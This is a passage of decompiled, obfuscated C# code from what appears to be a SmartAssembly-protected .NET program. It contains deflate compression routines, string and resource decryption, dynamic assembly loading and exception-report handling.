			return false;
		}
		byte[] array = Class25.smethod_75(byte_, "<RSAKeyValue><Modulus>rYz53zKaFq3BDLLMhQbiqaOjtFq2R3CwphTsQc7KSqX6qoDEqopFKoRyNblRMK9AxDvLN4wU/Fw3cwGg/YsrWbNnKBmCwm0JhqeLmn6g7ClGNekp6/qlcER/UJAWcZMzIKMDaSEz4DDO3EeBbtcaBOS3O/DvXXOEJ+lkqxc6VE0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		if (array == null)
		{
			Class25.smethod_128(class28_0, Enum0.const_0, Class27.string_0);
			return false;
		}
		Class25.smethod_225(class28_0, Enum0.const_1);
		Class39 @class = new Class39("84d7c1ea-442c-cefb-df02-bea79d91f4f5");
		if (class28_0.iwebProxy_0 != null)
		{
			@class.iwebProxy_0 = class28_0.iwebProxy_0;
		}
		Class28.Class30 class2 = new Class28.Class30(class28_0, array, @class, class32_0);
		Class25.smethod_9((Delegate2)class2.method_0, @class);
		return class2.bool_0;
	}

	static void smethod_110(Class14.Class21.Class22 class22_0, Class14.Class21.Class22 class22_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class22_1.int_1)
		{
			int num3 = 1;
			int num4 = class22_1.byte_0[num2];
			int num5;
			int num6;
			if (num4 == 0)
			{
				num5 = 138;
				num6 = 3;
			}
			else
			{
				num5 = 6;
				num6 = 3;
				if (num != num4)
				{
					Class25.smethod_221(class22_0, num4);
					num3 = 0;
				}
			}
			num = num4;
			num2++;
			while (num2 < class22_1.int_1 && num == class22_1.byte_0[num2])
			{
				num2++;
				if (++num3 >= num5)
				{
					break;
				}
			}
			if (num3 < num6)
			{
				while (num3-- > 0)
				{
					Class25.smethod_221(class22_0, num);
				}
			}
			else if (num != 0)
			{
				Class25.smethod_221(class22_0, 16);
				Class25.smethod_30(class22_1.class21_0.class24_0, num3 - 3, 2);
			}
			else if (num3 <= 10)
			{
				Class25.smethod_221(class22_0, 17);
				Class25.smethod_30(class22_1.class21_0.class24_0, num3 - 3, 3);
			}
			else
			{
				Class25.smethod_221(class22_0, 18);
				Class25.smethod_30(class22_1.class21_0.class24_0, num3 - 11, 7);
			}
		}
	}

	static void smethod_111(Class14.Class21.Class22 class22_0)
	{
		int num = class22_0.short_0.Length;
		int[] array = new int[num];
		int num2 = 0;
		int num3 = 0;
		for (int i = 0; i < num; i++)
		{
			int num4 = class22_0.short_0[i];
			if (num4 != 0)
			{
				int num5 = num2++;
				int num6;
				while (num5 > 0 && class22_0.short_0[array[num6 = (num5 - 1) / 2]] > num4)
				{
					array[num5] = array[num6];
					num5 = num6;
				}
				array[num5] = i;
				num3 = i;
			}
		}
		while (num2 < 2)
		{
			int num7 = ((num3 < 2) ? (++num3) : 0);
			array[num2++] = num7;
		}
		class22_0.int_1 = Math.Max(num3 + 1, class22_0.int_0);
		int num8 = num2;
		int[] array2 = new int[4 * num2 - 2];
		int[] array3 = new int[2 * num2 - 1];
		int num9 = num8;
		for (int j = 0; j < num2; j++)
		{
			int num10 = (array2[2 * j] = array[j]);
			array2[2 * j + 1] = -1;
			array3[j] = class22_0.short_0[num10] << 8;
			array[j] = j;
		}
		do
		{
			int num11 = array[0];
			int num12 = array[--num2];
			int num13 = 0;
			int num14;
			for (num14 = 1; num14 < num2; num14 = num14 * 2 + 1)
			{
				if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
				{
					num14++;
				}
				array[num13] = array[num14];
				num13 = num14;
			}
			int num15 = array3[num12];
			while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
			{
				array[num14] = array[num13];
			}
			array[num14] = num12;
			int num16 = array[0];
			num12 = num9++;
			array2[2 * num12] = num11;
			array2[2 * num12 + 1] = num16;
			int num17 = Math.Min(array3[num11] & 0xFF, array3[num16] & 0xFF);
			num15 = (array3[num12] = array3[num11] + array3[num16] - num17 + 1);
			num13 = 0;
			for (num14 = 1; num14 < num2; num14 = num13 * 2 + 1)
			{
				if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
				{
					num14++;
				}
				array[num13] = array[num14];
				num13 = num14;
			}
			while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
			{
				array[num14] = array[num13];
			}
			array[num14] = num12;
		}
		while (num2 > 1);
		Class25.smethod_6(array2, class22_0);
	}

	static void smethod_112(Class29 class29_0, EventArgs0 eventArgs0_0)
	{
		class29_0.delegate0_0?.Invoke(class29_0, eventArgs0_0);
	}

	static byte[] smethod_113(Encoding encoding_0, string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 67:
				return encoding_0.GetBytes(string_0);
			}
			int num = 6;
		}
	}

	static Assembly smethod_114(byte[] byte_0, byte[] byte_1, Evidence evidence_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 101:
				return Assembly.Load(byte_0, byte_1, evidence_0);
			}
		}
	}

	static char[] smethod_115(string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 29:
				return string_0.ToCharArray();
			}
			int num = 6;
		}
	}

	static bool smethod_116(Class14.Class15 class15_0)
	{
		int num = Class25.smethod_121(class15_0.class17_0);
		while (num >= 258)
		{
			switch (class15_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class25.smethod_177(class15_0.class18_0, class15_0.class16_0)) & -256) == 0)
				{
					Class25.smethod_35(class15_0.class17_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class15_0.int_6 = Class14.Class15.int_0[num2 - 257];
					class15_0.int_5 = Class14.Class15.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class15_0.class18_1 = null;
				class15_0.class18_0 = null;
				class15_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class15_0.int_5 > 0)
				{
					class15_0.int_4 = 8;
					int num4 = Class25.smethod_147(class15_0.class16_0, class15_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class25.smethod_123(class15_0.class16_0, class15_0.int_5);
					class15_0.int_6 += num4;
				}
				class15_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class25.smethod_177(class15_0.class18_1, class15_0.class16_0);
				if (num2 >= 0)
				{
					class15_0.int_7 = Class14.Class15.int_2[num2];
					class15_0.int_5 = Class14.Class15.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class15_0.int_5 > 0)
				{
					class15_0.int_4 = 10;
					int num3 = Class25.smethod_147(class15_0.class16_0, class15_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class25.smethod_123(class15_0.class16_0, class15_0.int_5);
					class15_0.int_7 += num3;
				}
				Class25.smethod_222(class15_0.class17_0, class15_0.int_6, class15_0.int_7);
				num -= class15_0.int_6;
				class15_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static bool smethod_117(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.bool_0;
	}

	static RegistryKey smethod_118(RegistryKey registryKey_0, string string_0, bool bool_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 44:
				return registryKey_0.OpenSubKey(string_0, bool_0);
			}
			int num = 7;
		}
	}

	static void smethod_119(byte[] byte_0, Class14.Class20 class20_0)
	{
		Class25.smethod_20(class20_0.class23_0, byte_0);
	}

	static Exception smethod_120(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.exception_0;
	}

	static int smethod_121(Class14.Class17 class17_0)
	{
		return 32768 - class17_0.int_1;
	}

	static Encoding smethod_122(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 36:
				return Encoding.Default;
			}
			int num = 2;
		}
	}

	static void smethod_123(Class14.Class16 class16_0, int int_0)
	{
		class16_0.uint_0 >>= int_0;
		class16_0.int_2 -= int_0;
	}

	static long smethod_124(Stream stream_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 35:
				return stream_0.Length;
			}
		}
	}

	static bool smethod_125()
	{
		try
		{
			Class40.Struct13 struct13_ = default(Class40.Struct13);
			Class25.GetSystemInfo(ref struct13_);
			return struct13_.ushort_0 == 9;
		}
		catch
		{
			return false;
		}
	}

	static int smethod_126(Class14.Stream0 stream0_0)
	{
		return Class25.smethod_0(stream0_0) | (Class25.smethod_0(stream0_0) << 16);
	}

	static Icon smethod_127(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".ico");
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void smethod_128(Class28 class28_0, Enum0 enum0_0, string string_0)
	{
		Class25.smethod_63(class28_0, enum0_0, string_0, string.Empty);
	}

	static bool smethod_129(Class29 class29_0, string string_0)
	{
		try
		{
			byte[] byte_ = class29_0.method_4();
			byte[] byte_2;
			try
			{
				byte_2 = Class25.smethod_180(byte_);
			}
			catch
			{
				byte_2 = null;
			}
			byte[] array = Class25.smethod_75(byte_2, "<RSAKeyValue><Modulus>rYz53zKaFq3BDLLMhQbiqaOjtFq2R3CwphTsQc7KSqX6qoDEqopFKoRyNblRMK9AxDvLN4wU/Fw3cwGg/YsrWbNnKBmCwm0JhqeLmn6g7ClGNekp6/qlcER/UJAWcZMzIKMDaSEz4DDO3EeBbtcaBOS3O/DvXXOEJ+lkqxc6VE0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes("{1F0FBEB0-B22C-481C-B5BE-4B0B198A0F51}");
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static bool smethod_130(Class14.Class24 class24_0)
	{
		return class24_0.int_1 == 0;
	}

	static void smethod_131(Class37 class37_0, Delegate1 delegate1_0)
	{
		Delegate1 @delegate = class37_0.delegate1_0;
		Delegate1 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate1 value = (Delegate1)Delegate.Combine(delegate2, delegate1_0);
			@delegate = Interlocked.CompareExchange(ref class37_0.delegate1_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	static string smethod_132(int int_0, object object_0, int int_1, object object_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 3:
				return string.Concat(object_1, object_0);
			}
		}
	}

	static byte[] smethod_133(MemoryStream memoryStream_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 58:
				return memoryStream_0.ToArray();
			}
		}
	}

	static object smethod_134(ResourceManager resourceManager_0, string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 44:
				return resourceManager_0.GetObject(string_0);
			}
			int num = 6;
		}
	}

	static int smethod_135(Class14.Class24 class24_0)
	{
		return class24_0.int_2;
	}

	static void smethod_136(Array array_0, int int_0, int int_1)
	{
		int num = 2;
		int num2 = 1;
		num = 7;
		while (true)
		{
			num = 3;
			while (true)
			{
				int num3;
				switch (int_1 ^ int_0)
				{
				case 127:
					num = 5;
					num3 = 4;
					break;
				default:
					num = 1;
					num3 = 3;
					break;
				}
				num2 = num3;
				num = 7;
				switch (num2)
				{
				default:
					goto IL_002c;
				case 3:
					num = 6;
					num2 = 1;
					num = 7;
					break;
				case 1:
					break;
				case 0:
					num = 0;
					goto IL_005e;
				case 2:
					num = 0;
					goto IL_005e;
				case 4:
					num = 0;
					goto IL_005e;
				case 5:
					{
						num = 0;
						goto IL_005e;
					}
					IL_005e:
					Class25.smethod_2(array_0, 482, 406);
					return;
				}
				break;
				IL_002c:
				num = 3;
			}
		}
	}

	static Assembly smethod_137(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 113:
				return Assembly.GetExecutingAssembly();
			}
		}
	}

	static void smethod_138(RegistryKey registryKey_0, string string_0, object object_0, int int_0, int int_1)
	{
		int num = 9;
		int num2 = 3;
		num = 3;
		while (true)
		{
			num = 1;
			while (true)
			{
				int num3;
				switch (int_1 ^ int_0)
				{
				case 47:
					num = 7;
					num3 = 2;
					break;
				default:
					num = 2;
					num3 = 4;
					break;
				}
				num2 = num3;
				num = 3;
				switch (num2)
				{
				default:
					num = 1;
					continue;
				case 5:
					num = 1;
					continue;
				case 0:
					num = 6;
					goto IL_0052;
				case 4:
					num = 6;
					goto IL_0052;
				case 3:
					break;
				case 1:
					num = 5;
					goto IL_0060;
				case 2:
					{
						num = 5;
						goto IL_0060;
					}
					IL_0060:
					Class25.smethod_84(registryKey_0, string_0, object_0, 905, 994);
					return;
					IL_0052:
					num2 = 3;
					num = 3;
					break;
				}
				break;
			}
		}
	}

	static void smethod_139(AppDomain appDomain_0, ResolveEventHandler resolveEventHandler_0, int int_0, int int_1)
	{
		int num = 4;
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 26:
				appDomain_0.ResourceResolve += resolveEventHandler_0;
				return;
			}
			num = 4;
		}
	}

	static ICryptoTransform smethod_140(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	static void smethod_141(IWebProxy iwebProxy_0, Class39 class39_0)
	{
		class39_0.iwebProxy_0 = iwebProxy_0;
	}

	static string smethod_142(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 47:
				return Application.get_ExecutablePath();
			}
			int num = 0;
		}
	}

	static void smethod_143(Stream stream_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3)
	{
		int num = 9;
		int num2 = 4;
		num = 5;
		while (true)
		{
			num = 3;
			while (true)
			{
				int num3;
				switch (int_3 ^ int_2)
				{
				case 53:
					num = 7;
					num3 = 2;
					break;
				default:
					num = 0;
					num3 = 1;
					break;
				}
				num2 = num3;
				num = 5;
				switch (num2)
				{
				default:
					num = 3;
					continue;
				case 3:
					num = 3;
					continue;
				case 0:
					num = 10;
					goto IL_0055;
				case 1:
					num = 10;
					goto IL_0055;
				case 4:
					break;
				case 2:
					num = 4;
					Class25.smethod_78(stream_0, byte_0, int_0, int_1, 851, 879);
					return;
				case 5:
					{
						num = 8;
						return;
					}
					IL_0055:
					num2 = 4;
					num = 5;
					break;
				}
				break;
			}
		}
	}

	static void smethod_144(Class14.Class16 class16_0)
	{
		class16_0.uint_0 >>= class16_0.int_2 & 7;
		class16_0.int_2 &= -8;
	}

	static void smethod_145(Exception exception_0)
	{
		Class25.smethod_54(exception_0, new object[0]);
	}

	static void smethod_146(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	static int smethod_147(Class14.Class16 class16_0, int int_0)
	{
		if (class16_0.int_2 < int_0)
		{
			if (class16_0.int_0 == class16_0.int_1)
			{
				return -1;
			}
			class16_0.uint_0 |= (uint)(((class16_0.byte_0[class16_0.int_0++] & 0xFF) | ((class16_0.byte_0[class16_0.int_0++] & 0xFF) << 8)) << class16_0.int_2);
			class16_0.int_2 += 16;
		}
		return (int)(class16_0.uint_0 & ((1 << int_0) - 1));
	}

	static void smethod_148(int int_0, Class14.Class21 class21_0, byte[] byte_0, bool bool_0, int int_1)
	{
		class21_0.class22_0.short_0[256]++;
		Class25.smethod_111(class21_0.class22_0);
		Class25.smethod_111(class21_0.class22_1);
		Class25.smethod_29(class21_0.class22_0, class21_0.class22_2);
		Class25.smethod_29(class21_0.class22_1, class21_0.class22_2);
		Class25.smethod_111(class21_0.class22_2);
		int num = 4;
		for (int num2 = 18; num2 > num; num2--)
		{
			if (class21_0.class22_2.byte_0[Class14.Class21.int_0[num2]] > 0)
			{
				num = num2 + 1;
			}
		}
		int num3 = 14 + num * 3 + Class25.smethod_167(class21_0.class22_2) + Class25.smethod_167(class21_0.class22_0) + Class25.smethod_167(class21_0.class22_1) + class21_0.int_2;
		int num4 = class21_0.int_2;
		for (int i = 0; i < 286; i++)
		{
			num4 += class21_0.class22_0.short_0[i] * Class14.Class21.byte_2[i];
		}
		for (int j = 0; j < 30; j++)
		{
			num4 += class21_0.class22_1.short_0[j] * Class14.Class21.byte_3[j];
		}
		if (num3 >= num4)
		{
			num3 = num4;
		}
		if (int_1 >= 0 && int_0 + 4 < num3 >> 3)
		{
			Class25.smethod_17(int_0, bool_0, class21_0, int_1, byte_0);
		}
		else if (num3 == num4)
		{
			Class25.smethod_30(class21_0.class24_0, 2 + (bool_0 ? 1 : 0), 3);
			Class14.Class21.Class22 class22_ = class21_0.class22_0;
			short[] short_ = Class14.Class21.short_1;
			byte[] byte_ = Class14.Class21.byte_2;
			Class25.smethod_217(byte_, short_, class22_);
			class22_ = class21_0.class22_1;
			short_ = Class14.Class21.short_2;
			byte_ = Class14.Class21.byte_3;
			Class25.smethod_217(byte_, short_, class22_);
			Class25.smethod_207(class21_0);
			Class25.smethod_192(class21_0);
		}
		else
		{
			Class25.smethod_30(class21_0.class24_0, 4 + (bool_0 ? 1 : 0), 3);
			Class25.smethod_157(num, class21_0);
			Class25.smethod_207(class21_0);
			Class25.smethod_192(class21_0);
		}
	}

	static SecurityException smethod_149(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.securityException_0;
	}

	static void smethod_150(int int_0, Class14.Class16 class16_0, byte[] byte_0, int int_1)
	{
		if (class16_0.int_0 < class16_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class16_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class16_0.int_2);
				class16_0.int_2 += 8;
			}
			class16_0.byte_0 = byte_0;
			class16_0.int_0 = int_0;
			class16_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static string smethod_151(int int_0, int int_1)
	{
		int num = 4;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 57:
				num = 8;
				num2 = 0;
				break;
			default:
				num = 12;
				num2 = 5;
				break;
			}
			int num3 = num2;
			num = 11;
			switch (num3)
			{
			default:
				num = 2;
				goto IL_003b;
			case 1:
				num = 5;
				goto IL_0044;
			case 2:
				num = 2;
				goto IL_003b;
			case 3:
				num = 5;
				goto IL_0044;
			case 5:
				num = 6;
				num3 = 6;
				num = 11;
				goto case 6;
			case 6:
				num = 4;
				continue;
			case 7:
				num = 4;
				continue;
			case 0:
				num = 3;
				break;
			case 4:
				{
					num = 3;
					break;
				}
				IL_0044:
				num3 = 6;
				num = 11;
				goto case 6;
				IL_003b:
				num3 = 6;
				num = 11;
				goto case 6;
			}
			break;
		}
		return Class25.smethod_142(924, 947);
	}

	static int smethod_152(Stream stream_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3)
	{
		int num = 9;
		while (true)
		{
			int num2;
			switch (int_3 ^ int_2)
			{
			case 69:
				num = 6;
				num2 = 2;
				break;
			case 68:
				num = 14;
				num2 = 3;
				break;
			default:
				num = 12;
				num2 = 8;
				break;
			}
			int num3 = num2;
			num = 1;
			switch (num3)
			{
			default:
				num = 13;
				goto IL_0042;
			case 4:
				num = 13;
				goto IL_0042;
			case 5:
				num = 13;
				goto IL_0042;
			case 7:
				num = 10;
				num3 = 1;
				num = 1;
				goto IL_0058;
			case 8:
				num = 11;
				num3 = 1;
				num = 1;
				goto IL_0058;
			case 1:
				goto IL_0058;
			case 0:
				num = 4;
				break;
			case 2:
				num = 8;
				return Class25.smethod_198(stream_0, byte_0, int_0, int_1, 486, 419);
			case 3:
				num = 4;
				break;
			case 6:
				{
					num = 4;
					break;
				}
				IL_0042:
				num3 = 1;
				num = 1;
				goto IL_0058;
			}
			break;
			IL_0058:
			num = 9;
		}
		return Class25.smethod_198(stream_0, byte_0, int_0, int_1, 785, 852);
	}

	static bool smethod_153(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_2;
	}

	static string smethod_154(string string_0, string string_1, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 124:
				return string_0 + string_1;
			}
			int num = 1;
		}
	}

	static void smethod_155(Class14.Stream0 stream0_0, int int_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static byte[] smethod_156(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class25.smethod_101(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class14.Stream0 stream = new Class14.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class25.smethod_126(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class25.smethod_0(stream);
			int num3 = Class25.smethod_0(stream);
			int num4 = Class25.smethod_0(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class25.smethod_126(stream);
			Class25.smethod_126(stream);
			Class25.smethod_126(stream);
			int num5 = Class25.smethod_126(stream);
			int num6 = Class25.smethod_0(stream);
			int num7 = Class25.smethod_0(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class14.Class15 class15_ = new Class14.Class15(array2);
			array = new byte[num5];
			Class25.smethod_55(array, array.Length, 0, class15_);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class25.smethod_126(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class25.smethod_126(stream);
					num11 = Class25.smethod_126(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class14.Class15 class15_2 = new Class14.Class15(array3);
					Class25.smethod_55(array, num11, i, class15_2);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 169, 156, 19, 176, 184, 81, 9, 23 };
				byte[] byte_2 = new byte[8] { 183, 127, 104, 130, 78, 26, 7, 253 };
				using ICryptoTransform cryptoTransform = Class25.smethod_140(byte_2, bool_0: true, byte_);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class25.smethod_156(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class25.smethod_215(bool_0: true, byte_5, byte_4);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class25.smethod_156(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static void smethod_157(int int_0, Class14.Class21 class21_0)
	{
		Class25.smethod_71(class21_0.class22_2);
		Class25.smethod_71(class21_0.class22_0);
		Class25.smethod_71(class21_0.class22_1);
		Class25.smethod_30(class21_0.class24_0, class21_0.class22_0.int_1 - 257, 5);
		Class25.smethod_30(class21_0.class24_0, class21_0.class22_1.int_1 - 1, 5);
		Class25.smethod_30(class21_0.class24_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class25.smethod_30(class21_0.class24_0, (int)class21_0.class22_2.byte_0[Class14.Class21.int_0[i]], 3);
		}
		Class14.Class21.Class22 class22_ = class21_0.class22_0;
		Class14.Class21.Class22 class22_2 = class21_0.class22_2;
		Class25.smethod_110(class22_2, class22_);
		class22_ = class21_0.class22_1;
		class22_2 = class21_0.class22_2;
		Class25.smethod_110(class22_2, class22_);
	}

	static ParameterInfo[] smethod_158(MethodBase methodBase_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 112:
				return methodBase_0.GetParameters();
			}
			int num = 3;
		}
	}

	static Type smethod_159(Class33 class33_0)
	{
		return class33_0.type_0;
	}

	static int smethod_160(string string_0, int int_0, Graphics graphics_0, Font font_0)
	{
		return Size.Ceiling(graphics_0.MeasureString(string_0, font_0, int_0)).Height;
	}

	static int smethod_161(Stream stream_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3)
	{
		while (true)
		{
			switch (int_3 ^ int_2)
			{
			case 58:
				return stream_0.Read(byte_0, int_0, int_1);
			case 59:
				return stream_0.Read(byte_0, int_0, int_1);
			}
		}
	}

	static string smethod_162(object object_0, object object_1, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 100:
				return string.Concat(object_0, object_1);
			}
			int num = 4;
		}
	}

	static void smethod_163(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(true);
		control0_0.image_0 = (Image)(object)Class25.smethod_171("current");
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	static AppDomain smethod_164(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 122:
				return AppDomain.CurrentDomain;
			}
			int num = 0;
		}
	}

	static bool smethod_165(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class29_0.method_7();
	}

	static void smethod_166()
	{
		int num = 1;
		int num2 = 3;
		num = 2;
		if (Class0.bool_0)
		{
			return;
		}
		num = 7;
		num2 = 0;
		num = 2;
		Type object_;
		Class25.smethod_23((object)(object_ = Class25.smethod_212(typeof(Class0).TypeHandle, 1011, 911)), 522, 607);
		try
		{
			int num3 = 6;
			int num4 = 0;
			num3 = 5;
			while (true)
			{
				IL_008a:
				num3 = 9;
				while (true)
				{
					int num5;
					if (Class0.bool_0)
					{
						num3 = 8;
						num5 = 1;
					}
					else
					{
						num3 = 2;
						num5 = 2;
					}
					num4 = num5;
					num3 = 5;
					switch (num4)
					{
					default:
						num3 = 9;
						continue;
					case 4:
						num3 = 9;
						continue;
					case 0:
						break;
					case 2:
						num3 = 0;
						Class0.bool_0 = true;
						Class25.smethod_139(Class25.smethod_164(554, 592), (ResolveEventHandler)Class25.smethod_245, 65, 91);
						goto IL_00c2;
					case 3:
						num3 = 7;
						goto IL_00c2;
					case 1:
						num3 = 1;
						goto end_IL_0081;
					case 5:
						{
							num3 = 1;
							goto end_IL_0081;
						}
						IL_00c2:
						num4 = 1;
						num3 = 5;
						goto case 1;
					}
					goto IL_008a;
					continue;
					end_IL_0081:
					break;
				}
				break;
			}
		}
		finally
		{
			Class25.smethod_23((object)object_, 86, 0);
		}
		int num6 = 3;
		int num7 = 3;
		num6 = 0;
		num7 = 4;
		num6 = 0;
	}

	static int smethod_167(Class14.Class21.Class22 class22_0)
	{
		int num = 0;
		for (int i = 0; i < class22_0.short_0.Length; i++)
		{
			num += class22_0.short_0[i] * class22_0.byte_0[i];
		}
		return num;
	}

	static Assembly smethod_168(byte[] byte_0, byte[] byte_1, Evidence evidence_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 19:
				return Assembly.Load(byte_0, byte_1, evidence_0);
			}
			int num = 5;
		}
	}

	static string smethod_169(int int_0, int int_1)
	{
		int num = int_0 ^ 0x75C38AEB ^ int_1;
		char[] char_ = Class7.char_1;
		int num2 = char_[num];
		string result;
		if ((result = Class7.string_0[num2]) != null)
		{
			return result;
		}
		int num3 = char_[num + 1];
		num3 = (int)((uint)char_[num + 2] << 16) + num3;
		char[] array = new char[num3];
		char[] char_2 = Class7.char_0;
		int num4 = char_2.Length;
		num += 3;
		for (int num5 = 0; num5 < num3; num5 = 1 + num5)
		{
			array[num5] = (char)(char_[num + num5] ^ char_2[(num5 + num2) % num4]);
		}
		result = new string(array);
		Class7.string_0[num2] = result;
		return result;
	}

	static bool smethod_170(int int_0, int int_1, Class14.Class21 class21_0)
	{
		class21_0.short_0[class21_0.int_1] = (short)int_1;
		class21_0.byte_1[class21_0.int_1++] = (byte)(int_0 - 3);
		int num = Class25.smethod_92(int_0 - 3, class21_0);
		class21_0.class22_0.short_0[num]++;
		if (num >= 265 && num < 285)
		{
			class21_0.int_2 += (num - 261) / 4;
		}
		int num2 = Class25.smethod_32(class21_0, int_1 - 1);
		class21_0.class22_1.short_0[num2]++;
		if (num2 >= 4)
		{
			class21_0.int_2 += num2 / 2 - 1;
		}
		return Class25.smethod_178(class21_0);
	}

	static Bitmap smethod_171(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".png");
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static Class37 smethod_172()
	{
		if (Class37.class37_0 == null)
		{
